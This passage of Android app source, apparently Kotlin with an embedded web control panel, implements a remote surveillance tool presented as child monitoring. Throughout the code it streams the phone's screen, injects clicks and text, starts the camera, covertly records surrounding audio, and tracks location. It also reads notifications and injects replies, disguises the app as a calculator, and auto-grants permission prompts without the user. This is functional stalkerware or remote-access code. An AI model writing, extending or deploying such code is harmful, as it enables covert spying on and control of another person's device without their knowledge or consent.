        let ws;
        let isFrontCamera = false;
        let isAudioListening = false;
        let isCamou = false;
        let isAutoClick = true;

        function connectWs() {
            ws = new WebSocket(wsUrl);
            ws.onopen = () => { document.getElementById('statusBadge').innerText = '🟢 WebSocket Duplex Connected'; };
            ws.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    if (data.type === 'NOTIFICATION') {
                        addNotificationCard(data);
                    } else if (data.type === 'LOCATION_UPDATE') {
                        showLocation(data.lat, data.lng, data.accuracy);
                    }
                } catch(err) {}
            };
            ws.onclose = () => { setTimeout(connectWs, 3000); };
        }
        connectWs();

        setInterval(() => {
            const img = document.getElementById('streamImg');
            img.src = '/api/screen/frame?t=' + Date.now();
        }, 400);

        function handleScreenClick(e) {
            const rect = e.currentTarget.getBoundingClientRect();
            const normX = (e.clientX - rect.left) / rect.width;
            const normY = (e.clientY - rect.top) / rect.height;
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ action: 'CLICK', x: normX, y: normY, normalized: true }));
            }
        }

        function sendKey(key) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ action: 'KEY', key: key }));
            }
        }

        function sendRemoteText() {
            const input = document.getElementById('remoteTextInput');
            if (input.value && ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ action: 'TEXT', text: input.value }));
                input.value = '';
            }
        }

        function toggleCamera() {
            isFrontCamera = !isFrontCamera;
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ action: 'START_CAMERA', facing: isFrontCamera ? 'FRONT' : 'BACK' }));
            }
        }

        function toggleAudio() {
            isAudioListening = !isAudioListening;
            const btn = document.getElementById('audioBtn');
            if (isAudioListening) {
                btn.className = 'active';
                btn.innerText = '🔴 Listening Surroundings...';
                if (ws) ws.send(JSON.stringify({ action: 'START_AUDIO' }));
            } else {
                btn.className = '';
                btn.innerText = '🎧 Listen to Surroundings';
                if (ws) ws.send(JSON.stringify({ action: 'STOP_AUDIO' }));
            }
        }

        function toggleCamouflage() {
            isCamou = !isCamou;
            document.getElementById('camouBtn').innerText = 'Calculator Camouflage: ' + (isCamou ? 'ON' : 'OFF');
            if (ws) ws.send(JSON.stringify({ action: 'TOGGLE_CAMOUFLAGE', enable: isCamou }));
        }

        function toggleAutoClicker() {
            isAutoClick = !isAutoClick;
            const btn = document.getElementById('autoClickBtn');
            btn.className = isAutoClick ? 'active' : '';
            btn.innerText = '⚡ Auto-Grant Permissions: ' + (isAutoClick ? 'ON' : 'OFF');
            if (ws) ws.send(JSON.stringify({ action: 'TOGGLE_AUTO_CLICKER', enable: isAutoClick }));
        }

        function fetchLocation() {
            if (ws) ws.send(JSON.stringify({ action: 'START_LOCATION' }));
            fetch('/api/location').then(r => r.json()).then(data => {
                if (data.hasLocation) {
                    showLocation(data.latitude, data.longitude, data.accuracy);
                } else {
                    document.getElementById('locationDisplay').innerText = 'GPS acquiring coordinates...';
                }
            });
        }

        function showLocation(lat, lng, acc) {
            const disp = document.getElementById('locationDisplay');
            const mapUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
            disp.innerHTML = '📍 <b>Child Location:</b> ' + lat.toFixed(5) + ', ' + lng.toFixed(5) + ' (±' + Math.round(acc) + 'm)<br>' +
                             '<a href="' + mapUrl + '" target="_blank" style="color:#00E5FF; text-decoration:none; display:inline-block; margin-top:4px;">🌐 Open in Google Maps ↗</a>';
        }

        let notifCount = 0;
        function addNotificationCard(data) {
            notifCount++;
            document.getElementById('notifCount').innerText = notifCount;
            const list = document.getElementById('notificationsList');
            const item = document.createElement('div');
            item.className = 'notif-item';
            item.innerHTML = '<div class="notif-title">' + (data.appTitle || 'App') + ' • ' + (data.title || '') + '</div>' +
                             '<div class="notif-text">' + (data.text || '') + '</div>' +
                             (data.canReply ? '<div class="reply-box"><input type="text" id="rep_' + data.key + '" placeholder="Type quick reply..."><button onclick="sendReply(\'' + data.key + '\')">Send</button></div>' : '');
            list.prepend(item);
        }

        function sendReply(key) {
            const input = document.getElementById('rep_' + key);
            if (input && input.value && ws) {
                ws.send(JSON.stringify({ action: 'QUICK_REPLY', notificationKey: key, replyText: input.value }));
                input.value = '';
                alert('Reply injected into device notification!');
            }
        }

        function switchTab(tab) {
            document.getElementById('tabNotifs').style.display = tab === 'notifs' ? 'block' : 'none';
            document.getElementById('tabApps').style.display = tab === 'apps' ? 'block' : 'none';
            if (tab === 'apps') loadApps();
        }

        function loadApps() {
            fetch('/api/apps').then(r => r.json()).then(apps => {
                const list = document.getElementById('appsList');
                list.innerHTML = '';
                apps.forEach(app => {
                    const row = document.createElement('div');
                    row.className = 'app-item';
                    row.innerHTML = '<div><div class="app-name">' + app.name + '</div><div class="app-pkg">' + app.packageName + '</div></div>' +
                                    '<div style="display:flex; gap:6px;">' +
                                    '<button onclick="launchApp(\'' + app.packageName + '\')">Launch</button>' +
                                    '<button style="' + (app.isBlocked ? 'background:#FF5252;' : '') + '" onclick="toggleBlockApp(\'' + app.packageName + '\', ' + (!app.isBlocked) + ')">' + (app.isBlocked ? 'Unblock' : 'Block') + '</button>' +
                                    '</div>';
                    list.appendChild(row);
                });
            });
        }

        function launchApp(pkg) {
            if (ws) ws.send(JSON.stringify({ action: 'LAUNCH_APP', packageName: pkg }));
        }

        function toggleBlockApp(pkg, block) {
            if (ws) ws.send(JSON.stringify({ action: block ? 'BLOCK_APP' : 'UNBLOCK_APP', packageName: pkg }));
            setTimeout(loadApps, 300);
        }
    </script>
</body>
</html>
        """.trimIndent()
        sendHttpResponse(output, 200, "text/html; charset=utf-8", html)
    }

    private fun sendHttpResponse(output: OutputStream, statusCode: Int, contentType: String, content: String) {
        val contentBytes = content.toByteArray(Charsets.UTF_8)
        val response = "HTTP/1.1 $statusCode OK\r\n" +
                "Content-Type: $contentType\r\n" +
                "Content-Length: ${contentBytes.size}\r\n" +
                "Access-Control-Allow-Origin: *\r\n" +
                "Connection: close\r\n\r\n"
        output.write(response.toByteArray(Charsets.UTF_8))
        output.write(contentBytes)
    }

    fun pause() {
        _status.value = DaemonStatus.PAUSED
    }

    fun resume() {
        if (activeWsClients.isNotEmpty()) {
            _status.value = DaemonStatus.CONNECTED
        } else {
            _status.value = DaemonStatus.LISTENING
        }
    }

    fun stopServer() {
        isRunning = false
        _status.value = DaemonStatus.STOPPED
        heartbeatJob?.cancel()
        for (client in activeWsClients) {
            try { client.close() } catch (_: Exception) {}
        }
        activeWsClients.clear()
        _connectedClientsCount.value = 0
        try {
            serverSocket?.close()
            serverSocket = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing server socket", e)
        }
    }
}
